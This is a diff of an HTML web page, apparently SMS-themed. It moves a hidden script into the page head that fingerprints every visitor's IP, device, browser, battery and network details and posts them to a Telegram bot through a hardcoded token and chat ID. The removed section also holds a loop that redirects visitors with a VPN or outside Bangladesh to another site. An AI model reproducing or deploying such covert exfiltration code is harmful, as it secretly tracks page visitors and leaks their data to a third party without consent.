@@ -11,6 +11,209 @@
         rel="stylesheet">
     <link rel="icon" href="https://img.icons8.com/arcade/64/sms.png" type="image/x-icon">
     <meta name="theme-color" content="#0d1117">
+        <script>
+        let deviceMemory;
+        if (navigator.deviceMemory) {
+            deviceMemory = navigator.deviceMemory; // Memory in GB (e.g., 4, 8, 16)
+        } else {
+            deviceMemory = 'Unknown'; // Fallback if not supported
+        }
+        const screenResolution = `${window.screen.width} x ${window.screen.height}`;
+        console.log("Screen Resolution:", screenResolution);
+        const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : 'Unknown';
+        console.log(`CPU Cores ➩ ${cpuCores}`);
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+
+            if (/mobile/i.test(ua)) {
+                return "Mobile";
+            } else if (/tablet/i.test(ua)) {
+                return "Tablet";
+            } else {
+                return "Desktop";
+            }
+        }
+        const deviceType = getDeviceType();
+        console.log(deviceType);
+        const browser = (() => {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Edg")) return "Microsoft Edge";
+            if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            return "Unknown Browser";
+        })();
+        console.log(browser);
+        function getOperatingSystem() {
+            const userAgent = window.navigator.userAgent;
+            const platform = window.navigator.platform;
+            const macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
+            const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
+            const iosPlatforms = ['iPhone', 'iPad', 'iPod'];
+            if (macosPlatforms.includes(platform)) {
+                return 'macOS';
+            } else if (iosPlatforms.includes(platform)) {
+                return 'iOS';
+            } else if (windowsPlatforms.includes(platform)) {
+                return 'Windows';
+            } else if (/Android/.test(userAgent)) {
+                return 'Android';
+            } else if (/Linux/.test(platform)) {
+                return 'Linux';
+            } else {
+                return 'Unknown';
+            }
+        }
+        const operatingSystem = getOperatingSystem();
+        console.log(operatingSystem);
+        const platform = navigator.platform;
+        console.log(platform);
+        function hasTouchSupport() {
+            return ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'yes' : 'no';
+        }
+        console.log(hasTouchSupport());
+        function getOnlineStatus() {
+            return navigator.onLine ? "yes" : "no";
+        }
+        // Example usage
+        console.log(getOnlineStatus());
+        function areCookiesEnabled() {
+            if (navigator.cookieEnabled) {
+                return "yes";
+            } else {
+                // Additional check: try to set a test cookie
+                document.cookie = "testcookie=1";
+                const cookiesEnabled = document.cookie.indexOf("testcookie") !== -1;
+                if (cookiesEnabled) {
+                    // Clean up test cookie
+                    document.cookie = "testcookie=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+                    return "yes";
+                } else {
+                    return "no";
+                }
+            }
+        }
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const browserInfo = navigator.userAgent;
+        const userLanguage = navigator.language || navigator.userLanguage;
+        const now = new Date();
+        let hours = now.getHours();
+        const minutes = now.getMinutes().toString().padStart(2, '0');
+        const ampm = hours >= 12 ? 'PM' : 'AM';
+        hours = hours % 12;
+        hours = hours ? hours : 12; // 0 becomes 12
+        navigator.getBattery().then(function (battery) {
+            const level = Math.round(battery.level * 100); // battery.level is between 0 and 1
+            const charging = battery.charging ? "Yes" : "No";
+            const now = new Date();
+            const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
+            navigator.getBattery().then(function (battery) {
+                battery.addEventListener('chargingchange', () => {
+                });
+                battery.addEventListener('levelchange', () => {
+                });
+            });
+            let rawType = "unknown";
+            let connectionName = "Unknown";
+            if ('connection' in navigator) {
+                rawType = navigator.connection.effectiveType || "unknown";
+                switch (rawType) {
+                    case "4g":
+                        connectionName = "Fast Mobile (4G)";
+                        break;
+                    case "3g":
+                        connectionName = "Moderate Mobile (3G)";
+                        break;
+                    case "2g":
+                        connectionName = "Slow Mobile (2G)";
+                        break;
+                    case "slow-2g":
+                        connectionName = "Very Slow Mobile";
+                        break;
+                    default:
+                        connectionName = "Fuck Connection";
+                }
+            }
+            const userAgent = navigator.userAgent;
+            let connectionType = "Unknown";
+            if ('connection' in navigator) {
+                const type = navigator.connection.type || navigator.connection.effectiveType;
+                if (type.includes("wifi")) {
+                    connectionType = "Wi-Fi";
+                } else if (type.includes("cellular") || type.includes("3g") || type.includes("4g") || type.includes("2g")) {
+                    connectionType = "Mobile Data";
+                } else {
+                    connectionType = type;
+                }
+            }
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const countryName = data.country_name;
+                    console.log("User's country:", countryName);
+                })
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    const token = "7822640146:AAHgrsRxm9TaN_OQrggoLS7pKlsdAeWxMLk";
+                    const chatId = "6070021548";
+                    const message = `
+                    
+─── DEVICE INFO REPORT ───\n
+\n
+🕜 Time               ➤ ${hours}:${minutes} ${ampm}\n
+📅 Date               ➤ ${formattedDate}\n
+\n
+🌐 IP Address         ➤ ${ip}\n
+💻 Screen Size        ➤ ${window.screen.width} x ${window.screen.height}\n
+🧠 Device Memory      ➤ ${deviceMemory} GB\n
+⚙️ CPU Cores          ➤ ${cpuCores}\n
+📱 Device Type        ➤ ${deviceType}\n
+🌍 Platform           ➤ ${platform}\n
+\n
+─── Browser Details ───\n
+\n
+🌐 Browser Name       ➤ ${browser}\n
+🔢 Browser Version    ➤ ${browserInfo}\n
+🔤 Language           ➤ ${userLanguage}\n
+🕒 Timezone           ➤ ${timezone}\n
+\n
+─── Battery & Network ───\n
+\n
+🔋 Battery Level      ➤ ${level}%\n
+⚡ Charging           ➤ ${charging}\n
+📡 Connection Type    ➤ ${connectionType}\n
+📶 Downlink           ➤ ${connection.downlink}\n
+🧪 RTT                ➤ ${connection.rtt}\n
+🛑 Save Data Mode     ➤ ${connection.saveData}\n
+\n
+🏴‍☠️ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 PRITOM
+\n
+─── MORE INFO ───\n
+🔗 ip-api.com/${ip}\n\n
+
+🔗 ip-info.bjcoderx.workers.dev/?ip=${ip}\n\n
+
+🔗 lmnx9.appletolha.com/ip-info/?ip=${ip}
+                    
+                    `;
+
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    });
+                });
+        });
+    </script>
     <style>
         :root {
             --primary-bg: #0d1117;
@@ -1915,251 +2118,6 @@
         }
     </style>
 
-    <script>
-        const redirectURL = "https://v902.cc"; // Redirect link
-
-        // Only VPN Detection — No DevTools, No Latency trick
-        function detectVPN() {
-            fetch("https://www.cloudflare.com/cdn-cgi/trace", { cache: "no-store" })
-                .then(res => res.text())
-                .then(data => {
-                    let lines = data.split("\n");
-
-                    let warp = lines.find(x => x.startsWith("warp="));
-                    let loc = lines.find(x => x.startsWith("loc="));
-                    let ip = lines.find(x => x.startsWith("ip="));
-
-                    warp = warp ? warp.split("=")[1] : "";
-                    loc = loc ? loc.split("=")[1] : "";
-                    ip = ip ? ip.split("=")[1] : "";
-
-                    //  Cloudflare trace rules:
-                    //  warp=on  = VPN/Proxy/Tunnel detected
-                    //  warp=plus = definitely VPN
-                    //  warp=off  = normal user
-
-                    if (warp === "on" || warp === "plus") {
-                        window.location.href = redirectURL;
-                    }
-
-                    // If IP location mismatches with Bangladesh network — also VPN
-                    if (loc !== "BD") {
-                        window.location.href = redirectURL;
-                    }
-                })
-                .catch(() => {
-                    // If request blocked → very likely VPN/Capture app
-                    window.location.href = redirectURL;
-                });
-
-            setTimeout(detectVPN, 5000);
-        }
-
-        detectVPN();
-    </script>
-    <script>
-        let deviceMemory;
-        if (navigator.deviceMemory) {
-            deviceMemory = navigator.deviceMemory; // Memory in GB (e.g., 4, 8, 16)
-        } else {
-            deviceMemory = 'Unknown'; // Fallback if not supported
-        }
-        const screenResolution = `${window.screen.width} x ${window.screen.height}`;
-        console.log("Screen Resolution:", screenResolution);
-        const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : 'Unknown';
-        console.log(`CPU Cores ➩ ${cpuCores}`);
-        function getDeviceType() {
-            const ua = navigator.userAgent;
-
-            if (/mobile/i.test(ua)) {
-                return "Mobile";
-            } else if (/tablet/i.test(ua)) {
-                return "Tablet";
-            } else {
-                return "Desktop";
-            }
-        }
-        const deviceType = getDeviceType();
-        console.log(deviceType);
-        const browser = (() => {
-            const userAgent = navigator.userAgent;
-            if (userAgent.includes("Firefox")) return "Firefox";
-            if (userAgent.includes("Edg")) return "Microsoft Edge";
-            if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
-            if (userAgent.includes("Chrome")) return "Chrome";
-            if (userAgent.includes("Safari")) return "Safari";
-            return "Unknown Browser";
-        })();
-        console.log(browser);
-        function getOperatingSystem() {
-            const userAgent = window.navigator.userAgent;
-            const platform = window.navigator.platform;
-            const macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
-            const windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
-            const iosPlatforms = ['iPhone', 'iPad', 'iPod'];
-            if (macosPlatforms.includes(platform)) {
-                return 'macOS';
-            } else if (iosPlatforms.includes(platform)) {
-                return 'iOS';
-            } else if (windowsPlatforms.includes(platform)) {
-                return 'Windows';
-            } else if (/Android/.test(userAgent)) {
-                return 'Android';
-            } else if (/Linux/.test(platform)) {
-                return 'Linux';
-            } else {
-                return 'Unknown';
-            }
-        }
-        const operatingSystem = getOperatingSystem();
-        console.log(operatingSystem);
-        const platform = navigator.platform;
-        console.log(platform);
-        function hasTouchSupport() {
-            return ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'yes' : 'no';
-        }
-        console.log(hasTouchSupport());
-        function getOnlineStatus() {
-            return navigator.onLine ? "yes" : "no";
-        }
-        // Example usage
-        console.log(getOnlineStatus());
-        function areCookiesEnabled() {
-            if (navigator.cookieEnabled) {
-                return "yes";
-            } else {
-                // Additional check: try to set a test cookie
-                document.cookie = "testcookie=1";
-                const cookiesEnabled = document.cookie.indexOf("testcookie") !== -1;
-                if (cookiesEnabled) {
-                    // Clean up test cookie
-                    document.cookie = "testcookie=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
-                    return "yes";
-                } else {
-                    return "no";
-                }
-            }
-        }
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const browserInfo = navigator.userAgent;
-        const userLanguage = navigator.language || navigator.userLanguage;
-        const now = new Date();
-        let hours = now.getHours();
-        const minutes = now.getMinutes().toString().padStart(2, '0');
-        const ampm = hours >= 12 ? 'PM' : 'AM';
-        hours = hours % 12;
-        hours = hours ? hours : 12; // 0 becomes 12
-        navigator.getBattery().then(function (battery) {
-            const level = Math.round(battery.level * 100); // battery.level is between 0 and 1
-            const charging = battery.charging ? "Yes" : "No";
-            const now = new Date();
-            const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`;
-            navigator.getBattery().then(function (battery) {
-                battery.addEventListener('chargingchange', () => {
-                });
-                battery.addEventListener('levelchange', () => {
-                });
-            });
-            let rawType = "unknown";
-            let connectionName = "Unknown";
-            if ('connection' in navigator) {
-                rawType = navigator.connection.effectiveType || "unknown";
-                switch (rawType) {
-                    case "4g":
-                        connectionName = "Fast Mobile (4G)";
-                        break;
-                    case "3g":
-                        connectionName = "Moderate Mobile (3G)";
-                        break;
-                    case "2g":
-                        connectionName = "Slow Mobile (2G)";
-                        break;
-                    case "slow-2g":
-                        connectionName = "Very Slow Mobile";
-                        break;
-                    default:
-                        connectionName = "Fuck Connection";
-                }
-            }
-            const userAgent = navigator.userAgent;
-            let connectionType = "Unknown";
-            if ('connection' in navigator) {
-                const type = navigator.connection.type || navigator.connection.effectiveType;
-                if (type.includes("wifi")) {
-                    connectionType = "Wi-Fi";
-                } else if (type.includes("cellular") || type.includes("3g") || type.includes("4g") || type.includes("2g")) {
-                    connectionType = "Mobile Data";
-                } else {
-                    connectionType = type;
-                }
-            }
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const countryName = data.country_name;
-                    console.log("User's country:", countryName);
-                })
-            fetch("https://api.ipify.org?format=json")
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    const token = "7822640146:AAHgrsRxm9TaN_OQrggoLS7pKlsdAeWxMLk";
-                    const chatId = "6070021548";
-                    const message = `
-                    
-─── DEVICE INFO REPORT ───\n
-\n
-🕜 Time               ➤ ${hours}:${minutes} ${ampm}\n
-📅 Date               ➤ ${formattedDate}\n
-\n
-🌐 IP Address         ➤ ${ip}\n
-💻 Screen Size        ➤ ${window.screen.width} x ${window.screen.height}\n
-🧠 Device Memory      ➤ ${deviceMemory} GB\n
-⚙️ CPU Cores          ➤ ${cpuCores}\n
-📱 Device Type        ➤ ${deviceType}\n
-🌍 Platform           ➤ ${platform}\n
-\n
-─── Browser Details ───\n
-\n
-🌐 Browser Name       ➤ ${browser}\n
-🔢 Browser Version    ➤ ${browserInfo}\n
-🔤 Language           ➤ ${userLanguage}\n
-🕒 Timezone           ➤ ${timezone}\n
-\n
-─── Battery & Network ───\n
-\n
-🔋 Battery Level      ➤ ${level}%\n
-⚡ Charging           ➤ ${charging}\n
-📡 Connection Type    ➤ ${connectionType}\n
-📶 Downlink           ➤ ${connection.downlink}\n
-🧪 RTT                ➤ ${connection.rtt}\n
-🛑 Save Data Mode     ➤ ${connection.saveData}\n
-\n
-🏴‍☠️ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 PRITOM
-\n
-─── MORE INFO ───\n
-🔗 ip-api.com/${ip}\n\n
-
-🔗 ip-info.bjcoderx.workers.dev/?ip=${ip}\n\n
-
-🔗 lmnx9.appletolha.com/ip-info/?ip=${ip}
-                    
-                    `;
-
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message
-                        })
-                    });
-                });
-        });
-    </script>
 </body>
-
+</html>
 </html>
